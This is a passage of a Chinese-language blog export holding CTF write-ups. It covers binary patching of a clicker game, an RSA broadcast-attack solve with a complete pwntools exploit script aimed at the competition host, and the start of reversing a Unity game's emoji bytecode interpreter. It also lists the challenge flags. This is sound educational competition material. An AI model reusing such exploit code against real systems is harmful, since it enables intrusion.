src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/70b2aa04-a4ef-4707-b492-3310618aab71\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eIDA 打開來看翻一翻，翻到 \u003ccode\u003esub_7FF7059813B0\u003c/code\u003e function 應該是處理點擊 pixel 的 function\u003c/p\u003e\n\u003cp\u003e最下面的 switch 是處理計數的，點擊次數是存在 \u003ccode\u003edword_7FF705985708\u003c/code\u003e 這個 global var 裡\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/72ef7d61-735f-4649-9ca6-dd9e3da2cf97\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e上面的 if 是判斷遊戲成功或失敗以及結束的區段。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4913f88e-2945-467c-9551-db008456d441\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以發現她會叫你點 600 次以上才結束\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/cebb170d-f9e5-4d24-9c0e-16dc496086d8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e最後通靈一下應該要把 Block 挖出來存起來看看。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8a2b2ffe-f6c7-4280-a7e2-b064a5a31978\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e因為 600 次太久了，所以把他 patch 成點 1 次就好\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8a2f7627-1cb1-4f23-ad2f-32cc5bba516f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c118eb07-af8f-43a5-a301-408297ae95b8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/1923ca83-0adb-4a3c-813c-b9014645ac59\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e中斷點設置在執行完 Block 以後\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/176512aa-3f28-4a07-8d75-f4102b91f56e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e找到 Block 的位置後，把她的資料在 Hex view 全部選取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6b4260c2-15a7-4c4a-af95-7ca64b8ff9ca\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7707d000-ab8a-49d5-b674-e6c9ac516952\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/1296e037-2f79-47c1-b3cc-65e3537b379c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e右鍵 save file\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/eb7411d6-450e-4917-a7ec-a131264fd044\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後開 cmd 用 file 看一下發現他長度有 1440054 bytes\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/73d6157e-ce99-45f2-b95e-5702cce3484f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e剛剛選取的不夠的話在重新做一次選取 1440054 bytes 然後 save file\u003c/p\u003e\n\u003cp\u003e最後用圖片的方式開，可以看到這張圖片\u003c/p\u003e\n\u003ch4 id=\"flag-6\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/82b2e164-ad8f-41ec-a2a5-f6f7188b1c65\" alt=\"data\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{jUSt_4_5imPLE_clICkEr_g@m3}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"crypto\"\u003eCrypto\u003c/h2\u003e\n\u003ch3 id=\"baby-rsa\"\u003eBaby RSA\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7045274e-382a-4447-bd6b-0890103f4304\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-6\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e進去會給你 N 跟 e 還有用這個 N 跟 e RSA 加密後的 flag 密文\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ca214c9e-1f44-4961-aa37-7eb8501ecad2\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e每次進去的 N 都不一樣，但是 e 都會是 3\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d3faef7b-6c5d-407a-aa03-c9ff9642b70d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以用 \u003ca href=\"https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/\"\u003eCoppersmith Basic Broadcast Attack\u003c/a\u003e，先收集一定數量的 N 跟 flag 密文，然後用 Broadcast Attack 破解密文就會拿到 flag\u003c/p\u003e\n\u003ch4 id=\"exploit-4\"\u003eexploit\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pwn \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e Crypto.Util.number \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e bytes_to_long, long_to_bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e gmpy2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e functools \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e reduce\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emodinv\u003c/span\u003e(a, m):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e int(gmpy2\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einvert(a, m))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echinese_remainder\u003c/span\u003e(n, a):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sum \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    prod \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e reduce(\u003cspan style=\"color:#66d9ef\"\u003elambda\u003c/span\u003e a, b: a \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e b, n)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e n_i, a_i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e zip(n, a):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        p \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e prod \u003cspan style=\"color:#f92672\"\u003e//\u003c/span\u003e n_i\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        sum \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e a_i \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e modinv(p, n_i) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e p\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e int(sum \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e prod)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    target \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    port \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    N \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(int(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e])):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        r \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e remote(target, port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvline()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        N\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(str(key\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e)[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;=\u0026#39;\u003c/span\u003e)[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        c\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(str(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvline()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e)[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip()))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eclose()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(json\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edumps({\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;N\u0026#39;\u003c/span\u003e: N, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e: c}))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e json\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eloads(f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    m \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e chinese_remainder([int(a) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e data[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;N\u0026#39;\u003c/span\u003e]], [int(a) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e data[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e]])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    m, state \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e gmpy2\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eiroot(m, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(hex(int(m)))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(long_to_bytes(m))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epython3 exp.py chal1.eof.ais3.org \u003cspan style=\"color:#ae81ff\"\u003e10002\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e data.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epython3 exp.py data.json\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"flag-7\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/af4527d1-9682-4ca5-9fd6-9db19a2ba2b3\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{c0pPerSMItH$_5hOr7_p@D_a7t4Ck}\u003c/code\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/","title":"AIS3 EOF 2024 Writeup"},{"content":"\u003ch1 id=\"tscctf-2024-official-writeup\"\u003eTSCCTF 2024 Official WriteUp\u003c/h1\u003e\n\u003cp\u003e這次與 TSC 的夥伴們一起舉辦了一場 CTF 比賽，而我則負責 infra 的建置以及出一題 reverse 題目，雖說我似乎難度沒有控好，還在學習控難度中。\u003c/p\u003e\n\u003ch1 id=\"just-shooting-game\"\u003eJust Shooting Game\u003c/h1\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/0137c941-cfd6-41f6-a329-52e6cfdff2de\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e基本上這題最大的難點有兩個：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e取得 magic 值\u003c/li\u003e\n\u003cli\u003e\u003cdel\u003e通靈出\u003c/del\u003e Transfer.exec 是某種 bytecode interpreter ，然後把解出來的 code 丟 IDA 之類的解析。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"解題\"\u003e解題\u003c/h2\u003e\n\u003cp\u003e這題 code 用 \u003ccode\u003eILSpy\u003c/code\u003e 逆會比較完整，但是這邊 writeup 還是用 Dnspy 寫。\u003c/p\u003e\n\u003cp\u003eDnSpy 打開 \u003ccode\u003eShootingGame_Data\\Managed\\Assembly-CSharp.dll\u003c/code\u003e 會發現有一些 Class 有一個叫 \u003ccode\u003ecode\u003c/code\u003e 的 string variable 裡面塞了一坨奇怪的東西，decode 以後會發現這些都 emoji。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/be16b075-60a1-42c0-8587-f80b934e9ba8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/880a248f-13de-40f2-8eeb-cfc99e405ea5\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/3cf4e779-ceb6-428a-8a60-530322d90fd1\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這些 \u003ccode\u003ecode\u003c/code\u003e 會在該 Class 裡和一個叫 \u003ccode\u003emagic\u003c/code\u003e 的變數做 \u003ccode\u003eTransfer.etob\u003c/code\u003e 運算以後，跟一些參數一起跑 \u003ccode\u003eTransfer.exec\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/e19af70d-a9c9-4e8e-a955-aa58db05ad20\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e通過與 \u003ccode\u003egun\u003c/code\u003e、\u003ccode\u003eenemy\u003c/code\u003e 等等 Class 比對後，發現 \u003ccode\u003eGameManager\u003c/code\u003e 是送入一個字串 Call \u003ccode\u003eTransfer.exec\u003c/code\u003e 以後會依據 Call 完後所得到的 value variable 轉成 Boolean 並判斷如果為 True 就把 \u003ccode\u003esupermode\u003c/code\u003e 設為 True，觀察 \u003ccode\u003egun\u003c/code\u003e class 會發現 \u003ccode\u003esupermode\u003c/code\u003e 會讓玩家進入無敵狀態並沒有攻擊速度限制，應該是一個打入作弊代碼會開啟作弊模式的東西。其他 Call \u003ccode\u003eTransfer.exec\u003c/code\u003e 的地方都是在做字串比對，可以判斷 \u003ccode\u003eTransfer.exec\u003c/code\u003e 會依據 \u003ccode\u003ecode\u003c/code\u003e 跟 \u003ccode\u003emagic\u003c/code\u003e 運算後的 byte array 做相應的事情，但是 \u003ccode\u003eTransfer.exec\u003c/code\u003e 到底做了甚麼還不清楚，同時因為只有 \u003ccode\u003eGameManager\u003c/code\u003e 不是字串比對，所以目標可能在這裡，猜測那個作弊代碼可能就是 flag。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/b32993fd-a56a-4923-a9a8-96d1783c6da2\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/9625d27f-490a-4e3f-b838-acb916a983a8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/e84a351d-4f57-4f20-acf1-889c1c962849\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e觀察 \u003ccode\u003eTransfer.etob\u003c/code\u003e 以後會發現他會將輸入的字串的做 UTF32 decode 以後依照不同的 range 減掉特定的 offset 以後跟 \u003ccode\u003emagic\u003c/code\u003e 做 XOR，最後減掉 128512 後強轉成 byte 然後拼回 byte array 回傳。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/40c38580-272d-409c-bdea-67a283cdbd8c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e解析 \u003ccode\u003eTransfer.exec\u003c/code\u003e 可以發現他的參數變數名稱有 \u003ccode\u003ecode\u003c/code\u003e、\u003ccode\u003emem\u003c/code\u003e、\u003ccode\u003esp\u003c/code\u003e、\u003ccode\u003ebp\u003c/code\u003e 等等疑似 memory、CPU register 的東西，但是因為他太長了要猜一下，直接整個 function 丟給 chatgpt 判斷一下，我是用 GPT4，但是 GPT 3.5 也可以，只是要分段送。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/c0f4cc85-2eb4-4785-858a-00edb41203a2\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/7009e318-4c3f-4efb-873d-239b74c0c739\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/5b56c4c4-4f0a-4186-8cd8-1ed36fd1d94d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/45ade104-80c7-4565-90c9-0481b6c32b54\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/e95ccc23-b8a2-4aed-91f2-cdd1efe23657\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/40bc55c2-fb60-4c3b-83d0-7d1dd0b50021\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/cfeeaf1a-1b40-48f5-b188-7eaac2cedd8c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/4539a256-65d0-4600-b50c-e036f5690b93\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以確認這確實是某種 bytecode interpreter，這邊就可以知道 \u003ccode\u003ecode\u003c/code\u003e 跟 \u003ccode\u003emagic\u003c/code\u003e 經過 \u003ccode\u003eTransfer.etob\u003c/code\u003e 以後會變成 bytecode 然後 \u003ccode\u003eTransfer.exec\u003c/code\u003e 再依據的命令執行 bytecode 的動作，首先我們要發 bytecode 弄出來，但是會發現我們沒有 \u003ccode\u003emagic\u003c/code\u003e 的值。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/8f36b8af-d752-4cb1-b1ed-ecb764dd30fa\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e寫過 unity 的話就會知道 \u003ccode\u003eMonoBehaviour\u003c/code\u003e 可以附加在 GameObject 上面，並且直接在 GameObject 上面指定 public variable 的值，這些在 build 完會存成 asset，所以需要找可以解析 unity asset 的工具。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/890b3045-7e06-49d8-a145-10ae308e3881\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e用 \u003ccode\u003eAssetRipper\u003c/code\u003e 解開並且 export 出來，一個一個找太慢所以直接對 export 完的資料夾下 \u003ccode\u003egrep -A 2 -B 2 -r magic .\u003c/code\u003e，他會把資料夾下所有檔案中含有 \u003ccode\u003emagic\u003c/code\u003e 字串的行跟他的上下兩行印出來，為了濾出正確的，需要觀察 \u003ccode\u003emagic\u003c/code\u003e 的上下兩行有沒有  \u003ccode\u003eGameManager\u003c/code\u003e 的其他 variable ， 會發現 \u003ccode\u003emagic: 228\u003c/code\u003e 上有一個叫 \u003ccode\u003em_nextLevel\u003c/code\u003e 的 variable，可以判斷 \u003ccode\u003eGameManager\u003c/code\u003e 的 \u003ccode\u003emagic\u003c/code\u003e 就是 228。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/94c57fcd-184d-4e2d-aee0-36cce9b74d05\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/813779f0-6fc8-4cc5-8329-fa976def9ce6\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e用 python 寫 \u003ca href=\"exploit/unicodetoemoji.py\"\u003eunicodetoemoji.py\u003c/a\u003e 跟 \u003ca href=\"exploit/emojitobyte.py\"\u003eemojitobyte.py\u003c/a\u003e 把他解成 bytecode 並存成檔案。\u003c/p\u003e\n\u003cp\u003e接著把解出來的 bytecode 丟 Disassembler 的工具，這邊要猜一下是哪種指令集，這個 \u003ca href=\"https://shell-storm.org/online/Online-Assembler-and-Disassembler\"\u003eOnline-Assembler-and-Disassembler\u003c/a\u003e 網站不錯用，或者直接 IDA 用 x64 解看看，我們會拿到這坨。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/3f9e5b21-2d7e-416f-8efa-bd5c123e9ce0\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e解析他可以得知，輸入的字串的位址在 \u003ccode\u003erax\u003c/code\u003e，他會先把 \u003ccode\u003erax\u003c/code\u003e 推到 stack 再來把比對目標也推到 stack，然後將輸入字串的每個字元依照特定順序做 \u003ccode\u003einput[a] = (input[a] ^ input[b]) +- num\u003c/code\u003e，最後將運算結果跟比對目標迴圈比對是否完全一樣，如果一樣就將 \u003ccode\u003erax\u003c/code\u003e 設為 1，否則為 0。\u003c/p\u003e\n\u003cp\u003e\u003cimg 